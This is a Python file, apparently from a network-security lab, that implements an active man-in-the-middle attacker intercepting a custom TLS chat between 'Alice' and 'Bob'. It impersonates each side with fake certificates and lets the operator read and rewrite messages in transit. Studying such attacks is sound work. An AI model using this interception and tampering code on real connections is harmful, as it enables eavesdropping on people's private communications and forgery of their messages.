import select, socket, ssl, queue as Queue
import chat_utils as chat_utils
from colorama import Fore, Style

#This class implements the Active mitm attack which Trudy does to tamper the chat communication between Alice and Bob.
class Active_MITM:
    #Setting up the downgrade server with IP address and port 8000.
    def __init__(self, self_ip, server_ip, client_ip):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self_ip, 8000))
        self.server.listen(5)
        self.trust_store = chat_utils.make_trust_store(['./rootCA.crt'])
        print(Fore.GREEN + Style.BRIGHT + 'Server up and running! Waiting for connections...\n')

        #Intercepting connections from the client to server.
        connection, client_address = self.server.accept()
        self.client_handshake(connection)

        new_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #Connecting to the server to now establish an indirect link between a client and server
        new_socket.connect((server_ip, 8000))
        self.server_handshake(new_socket)
        print(Fore.CYAN + Style.BRIGHT + "Intercepting messages...\n")
        
        # Setting the connection to non blocking, so that the Trudy can send and recieve messages whenever.
        self.server.setblocking(0)
        self.server_side.setblocking(0)

        self.start_mitm()

    def start_mitm(self):
        # The list of input streams present.
        self.inputs = [self.client_side, self.server_side]
        # The list of entities with pending outgoing messages.
        self.outputs = []
        # message queues for the pending outgoing messages.
        self.message_queues = {}
        # A message queue for the pending outgoing messages to the client.
        self.message_queues[self.client_side] = Queue.Queue()
        # A message queue for the pending outgoing messages to the server.
        self.message_queues[self.server_side] = Queue.Queue()
        # Lists to contain the received fragments of a message untill all of its fragments have arrived.
        self.fragment_lists = {}
        # A list to contain the received fragments of a message untill all of its fragments have arrived on the client side.
        self.fragment_lists[self.client_side] = []
        # A list to contain the received fragments of a message untill all of its fragments have arrived on the server side.
        self.fragment_lists[self.server_side] = []
        # The number of messages sent so far.
        self.received_message_numbers = {}
        self.received_message_numbers[self.client_side] = 0
        self.received_message_numbers[self.server_side] = 0
        self.lastline_type = self.client_side
        # Now running a loop for as long as the connection between the server and client exists.
        while len(self.inputs) > 1:
            # Using the select library to filter the inputs and outputs list and obtain from them the entities that are ready for IO.
            readable, writable, exceptional = select.select(self.inputs, self.outputs, self.inputs)
            # Iterating over all the entities that have pending messages to be read
            for s in readable:
                try:
                    incoming_msg = s.recv(4096).decode('UTF-8')
                    self.handle_new_message(s, incoming_msg)
                except ssl.SSLWantReadError:
                    pass
            # Now iterating over the list of entities that have pending messages to be written to.
            for s in writable:
                try:
                    next_msg = self.message_queues[s].get_nowait()
                except Queue.Empty:
                    self.outputs.remove(s)
                else:
                    # If the user types CHAT_CLOSE, it means that he intends to close the connection.
                    if next_msg.decode('UTF-8') == chat_utils.CHAT_CLOSE:
                        person = 'Bob'
                        if s is self.server_side:
                            person = 'Alice'
                        print(Fore.RED + Style.BRIGHT + '\n' + person +' closed the connection!', Style.RESET_ALL+'\n')
                        s.send(next_msg)
                        self.close_connection(s)
                        break
                    else:
                    # If the message is not CHAT_CLOSE, then in accordance with the protocol,the message is sent.
                        s.send(next_msg)
            # Iterating over the list of entities that have thrown an exception.
            for s in exceptional:
                self.close_connection(s)

    # This function handles the messages received from the user.
    def handle_new_message(self, s, data):
        # If the user types CHAT_CLOSE, it means that he intends to close the connection and message is send in accordance to the protocol.
        if data == chat_utils.CHAT_CLOSE:
            self.send_message(s,data,0)
        else:
            # First the details of the message like the message number, number of fragments and the fragment number are obtained.
            msg_num, num_fragments, fragment_num = chat_utils.get_message_details(data)
            # if the message number is not equal to the number of messages received yet, it implies that this is a new message.
            if self.received_message_numbers[s] != msg_num:
                self.received_message_numbers[s] = msg_num
                # If the new message has only one fragment, then we just print it.
                if num_fragments == 1:
                    output_msg = self.print_message(s, data[28:])
                    self.send_message(s, output_msg, msg_num)
                # If it has more than one fragment then we append it into the fragment list.
                else:
                    self.fragment_lists[s].append(data)
            # If the message received is not an entirely new message but a fragment of a message,
            else:
                # If the fragment received is indeed the last fragment, then we can parse all the received fragments, reconstruct the message and display it.
                if num_fragments == fragment_num:
                    self.fragment_lists[s].append(data)
                    received_msg = chat_utils.parse(self.fragment_lists[s])
                    output_msg = self.print_message(s, received_msg)
                    self.send_message(s, output_msg, msg_num)
                    self.fragment_lists[s].clear()
                # If the received fragment is not the last fragment, then we simply append it into the fragment list.
                else:
                    self.fragment_lists[s].append(data)

    # This is a handy function to send the messages.
    def send_message(self, s, message, msg_number):
        if message == chat_utils.CHAT_CLOSE:
            msg_blocks = [message.encode('UTF-8')]
        else:
            msg_blocks = chat_utils.fragment(message, msg_number)
        if s is self.client_side:
            for msg in msg_blocks:
                self.message_queues[self.server_side].put(msg)
            if self.server_side not in self.outputs:
                self.outputs.append(self.server_side)
        else:
            for msg in msg_blocks:
                self.message_queues[self.client_side].put(msg)
            if self.client_side not in self.outputs:
                self.outputs.append(self.client_side)

    # This is a handy function to print the messages.
    def print_message(self, s, message):
        if self.lastline_type != s:
            print("")
            self.lastline_type = s
        if s is self.client_side:
            print(Fore.YELLOW + Style.BRIGHT +'Alice says: ', Fore.BLUE + Style.BRIGHT + message, Fore.WHITE + Style.BRIGHT + ' Alter message? [Y/N]: ',Fore.CYAN + Style.BRIGHT, end="")
        else:
            print(Fore.MAGENTA + Style.BRIGHT +'Bob says: ', Fore.GREEN + Style.BRIGHT + message, Fore.WHITE + Style.BRIGHT + ' Alter message? [Y/N]: ',Fore.CYAN + Style.BRIGHT, end="")
        response = input()
        alternate_text = message
        if (response == 'Y' or response == 'y'):
            alternate_text = input("Alternate text:  ")
        return alternate_text
    
    # This is a handy function to help with the closing of the connection.
    def close_connection(self, s):
        if s in self.outputs:
            self.outputs.remove(s)
        self.inputs.remove(s)
        s.close()
        del self.message_queues[s]
        del self.received_message_numbers[s]
        del self.fragment_lists[s]

    # This function carries out the chat protocol initiation and completes the client side handshake.
    def client_handshake(self, connection):
        incoming_msg = connection.recv(4096).decode('UTF-8')
        if incoming_msg == chat_utils.CHAT_HELLO:
            response_msg = chat_utils.CHAT_REPLY
            connection.sendall(response_msg.encode('UTF-8'))
            incoming_msg = connection.recv(4096).decode('UTF-8')
            if incoming_msg == chat_utils.CHAT_STARTTLS:
                response_msg = chat_utils.CHAT_STARTTLS_ACK
                connection.sendall(response_msg.encode('UTF-8'))
                #Trudy uses fake certificates inorder to pretend to be bob
                secureClientSocket = ssl.wrap_socket(connection, 
                        server_side=True, 
                        ca_certs="./rootCA.crt", 
                        certfile="./fakebob.crt",
                        keyfile="./fakebob.key", 
                        cert_reqs=ssl.CERT_REQUIRED,
                        ssl_version=ssl.PROTOCOL_TLS)
                clientCert = secureClientSocket.getpeercert(binary_form=True)
                # verifying the validity and integrity of the server certificate against the trust store.
                if chat_utils.cert_checker(clientCert, self.trust_store):
                    incoming_msg = secureClientSocket.recv(4096).decode('UTF-8')
                    if incoming_msg == chat_utils.CHAT_HANDSHAKE_COMPLETED:
                        self.client_side = secureClientSocket
                        # Secure connection successfully established using TLS 1.3.
                        return chat_utils.HANDSHAKE_SUCESS_TLS
                    else:
                        response_msg = chat_utils.CHAT_INVALID_HANDSHAKE
                        connection.sendall(response_msg.encode('UTF-8'))
                        secureClientSocket.close()
                        connection.close()
                else:
                    response_msg = chat_utils.CHAT_INVALID_CERTIFICATE
                    connection.sendall(response_msg.encode('UTF-8'))
                    secureClientSocket.close()
                    connection.close()
            elif incoming_msg == chat_utils.CHAT_HANDSHAKE_COMPLETED:
                self.client_side = connection 
                # Plain text connection successfully established.
                return chat_utils.HANDSHAKE_SUCESS_NO_TLS
            else:
                response_msg = chat_utils.CHAT_INVALID_HANDSHAKE
                connection.sendall(response_msg.encode('UTF-8'))
                connection.close()
        else:
            response_msg = chat_utils.CHAT_INVALID_HANDSHAKE
            connection.sendall(response_msg.encode('UTF-8'))
            connection.close()
        # Connection failed wither due to inconsistencies in the protocol or due to invalid certificate.
        return chat_utils.HANDSHAKE_FAILED

    # This function carries out the chat protocol initiation and completes server side handshake.
    def server_handshake(self, new_socket):
        input_str = chat_utils.CHAT_HELLO
        new_socket.sendall(input_str.encode('UTF-8'))
        resp = new_socket.recv(4096).decode('UTF-8')
        if resp == chat_utils.CHAT_REPLY:
            input_str = chat_utils.CHAT_STARTTLS
            new_socket.sendall(input_str.encode('UTF-8'))
            resp = new_socket.recv(4096).decode('UTF-8')
            if resp == chat_utils.CHAT_STARTTLS_ACK:
                context = self.get_server_side_TLS_context()
                secureSocket = context.wrap_socket(new_socket)
                serverCert = secureSocket.getpeercert(binary_form=True)
                # verifying the validity and integrity of the server certificate against the trust store.
                if chat_utils.cert_checker(serverCert, self.trust_store):
                    self.server_side = secureSocket
                    input_str = chat_utils.CHAT_HANDSHAKE_COMPLETED
                    secureSocket.sendall(input_str.encode('UTF-8'))
                    # Secure connection successfully established using TLS 1.3.
                    return chat_utils.HANDSHAKE_SUCESS_TLS
                else:
                    input_str = chat_utils.CHAT_INVALID_CERTIFICATE
                    new_socket.sendall(input_str.encode('UTF-8'))
                    secureSocket.close()
                    new_socket.close()
            elif resp == chat_utils.CHAT_STARTTLS_NOT_SUPPORTED:
                self.server_side = socket
                input_str = chat_utils.CHAT_HANDSHAKE_COMPLETED
                new_socket.sendall(input_str.encode('UTF-8'))
                # Plain text connection successfully established.
                return chat_utils.HANDSHAKE_SUCESS_NO_TLS
            else:
                input_str = chat_utils.CHAT_INVALID_HANDSHAKE
                new_socket.sendall(input_str.encode('UTF-8'))
                new_socket.close()
        else:
            input_str = chat_utils.CHAT_INVALID_HANDSHAKE
            new_socket.sendall(input_str.encode('UTF-8'))
            new_socket.close()
        # Connection failed wither due to inconsistencies in the protocol or due to invalid certificate.
        return chat_utils.HANDSHAKE_FAILED

    def get_server_side_TLS_context(self):
        # creates a SSL context with all the necessary information
        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        context.verify_mode = ssl.CERT_REQUIRED
        context.load_verify_locations("./rootCA.crt")
        context.load_cert_chain(certfile="./fakealice.crt", keyfile="./fakealice.key")
        # This is to enforce the usage of TLS 1.3
        context.options = ssl.OP_NO_TLSv1_2 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1 | ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
        return context
